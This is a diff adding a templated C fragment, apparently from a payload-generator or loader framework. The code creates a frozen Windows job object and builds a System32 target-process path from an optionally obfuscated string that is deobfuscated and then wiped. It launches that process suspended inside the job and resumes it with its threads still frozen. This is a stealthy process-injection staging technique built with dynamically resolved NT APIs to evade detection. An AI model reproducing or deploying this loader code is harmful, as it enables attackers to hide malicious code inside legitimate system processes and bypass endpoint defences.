@@ -1,0 +1,90 @@
+    char lpPath[MAX_PATH * 2];
+    char WnDr[MAX_PATH];
+
+    DEBUG_PRINT("Creating job object for process freezing...");
+    NTSTATUS jobStatus = pfnNtCreateJobObject(&hJob, JOB_OBJECT_ALL_ACCESS, NULL);
+    if (!NT_SUCCESS(jobStatus)) {
+        DEBUG_PRINT("NtCreateJobObject failed: 0x%X", jobStatus);
+        return;
+    }
+
+    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
+    freezeInfo.FreezeOperation = 1;
+    freezeInfo.Freeze = TRUE;
+
+    jobStatus = pfnNtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, 
+                                           &freezeInfo, sizeof(freezeInfo));
+    if (!NT_SUCCESS(jobStatus)) {
+        DEBUG_PRINT("NtSetInformationJobObject (freeze) failed: 0x%X", jobStatus);
+        pfnCloseHandle(hJob);
+        return;
+    }
+
+    if (!pfnGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+        DEBUG_PRINT("GetEnvironmentVariableA failed with error %d", pfnGetLastError());
+        pfnCloseHandle(hJob);
+        return;
+    }
+
+    char sSystem32[] = "\\System32\\";
+    
+    {% if obfuscate_execution_strings %}
+    unsigned char sTargetProcess_obfuscated[] = { {{ target_process_obfuscated }} };
+    char sTargetProcess[sizeof(sTargetProcess_obfuscated)];
+    
+    pfnRtlMoveMemory(sTargetProcess, sTargetProcess_obfuscated, sizeof(sTargetProcess_obfuscated));
+    DeobfuscateString((unsigned char*)sTargetProcess, sizeof(sTargetProcess_obfuscated));
+    sTargetProcess[sizeof(sTargetProcess_obfuscated)] = '\0';
+
+    DEBUG_PRINT("Deobfuscated target process name");
+    {% else %}
+    char sTargetProcess[] = "{{ target_process }}";
+    {% endif %}
+
+    size_t sWnDrLen = pfnLstrlenA(WnDr);
+    size_t sSystem32Len = pfnLstrlenA(sSystem32);
+    size_t sTargetProcessLen = pfnLstrlenA(sTargetProcess);
+
+    pfnRtlMoveMemory(lpPath, WnDr, sWnDrLen);
+    pfnRtlMoveMemory(lpPath + sWnDrLen, sSystem32, sSystem32Len);
+    pfnRtlMoveMemory(lpPath + sWnDrLen + sSystem32Len, sTargetProcess, sTargetProcessLen);
+    
+    lpPath[sWnDrLen + sSystem32Len + sTargetProcessLen] = '\0';
+    
+    DEBUG_PRINT("Constructed path: '%s'", lpPath);
+
+    {% if obfuscate_execution_strings %}
+    pfnRtlZeroMemory(sTargetProcess, sizeof(sTargetProcess));
+    {% endif %}
+
+    DEBUG_PRINT("Creating suspended process in job object...");
+    
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    pfnRtlZeroMemory(&si, sizeof(si));
+    pfnRtlZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+
+    if (!pfnCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, 
+                          CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB, 
+                          NULL, NULL, &si, &pi)) {
+        DEBUG_PRINT("CreateProcessA failed with error: %d", pfnGetLastError());
+        pfnCloseHandle(hJob);
+        return;
+    }
+
+    jobStatus = pfnNtAssignProcessToJobObject(hJob, pi.hProcess);
+    if (!NT_SUCCESS(jobStatus)) {
+        DEBUG_PRINT("NtAssignProcessToJobObject failed: 0x%X", jobStatus);
+        pfnCloseHandle(pi.hThread);
+        pfnCloseHandle(pi.hProcess);
+        pfnCloseHandle(hJob);
+        return;
+    }
+
+    hTargetProcess = pi.hProcess;
+    hTargetThread = pi.hThread;
+    DEBUG_PRINT("Successfully created suspended process in job with PID: %lu", pi.dwProcessId);
+
+    DEBUG_PRINT("Resuming process - threads remain frozen by job object...");
+    pfnResumeThread(hTargetThread);
